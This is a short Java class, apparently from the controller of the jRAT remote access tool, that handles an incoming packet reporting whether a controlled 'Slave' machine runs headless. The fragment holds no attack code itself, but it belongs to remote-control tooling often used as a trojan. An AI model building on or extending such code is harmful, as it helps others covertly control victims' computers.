package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;

public class Packet20Headless extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		boolean headless = dis.readBoolean();

		slave.setHeadless(headless);
	}
}
